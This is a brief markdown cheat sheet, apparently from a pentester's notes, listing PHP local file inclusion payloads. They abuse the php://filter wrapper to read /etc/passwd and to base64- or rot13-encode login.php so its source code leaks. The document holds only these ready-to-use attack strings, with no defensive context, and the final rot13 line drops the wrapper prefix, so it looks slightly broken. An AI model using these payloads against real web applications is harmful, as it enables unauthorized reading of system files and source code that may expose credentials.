#lfi #php

## Text File
```
?file=php://filter/resource=/etc/passwd	
```

## PHP File
To read php files we have to convert them:

```
?file=php://filter/read=convert.base64-encode/resource=login.php
```

```
?file=php://filter/convert.base64-encode/resource=login.php
```

```
?file=filter/read=string.rot13/resource=login.php
```
